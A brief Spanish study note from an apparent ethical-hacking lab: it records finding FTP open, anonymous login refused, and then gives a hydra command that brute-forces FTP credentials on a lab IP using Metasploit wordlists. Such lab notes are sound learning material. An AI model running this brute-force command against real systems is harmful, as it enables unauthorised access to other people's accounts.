#HackingActiveDirectoy #PinguinoMario #HackingEtico 
Hacemos un escaneo y vemos que el puerto 21 está abierto:
![[Pasted image 20230727153653.png]]
Pero no permite el login como anonymous:
![[Pasted image 20230727153713.png]]
Por tanto hacemos ataque de fuerza bruta usando diccionarios de metasploit con hydra:
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.25.40 ftp
```
![[Pasted image 20230727154835.png]]